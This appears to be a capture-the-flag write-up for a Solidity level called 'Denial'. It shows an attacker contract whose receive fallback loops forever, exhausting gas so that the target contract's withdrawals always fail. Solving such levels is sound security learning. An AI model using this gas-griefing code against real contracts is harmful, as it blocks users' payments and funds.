# 20-Denial

1. To deny `Denial` contract, we can create a `DenialAttack` contract as a partner, where in `receive` fallback, we define infinite loop causing the call always out of gas.

```solidity
    receive() external payable {
        uint here = 0;
        while (true) {
            // forever in here
            here++;
        }
    }
```
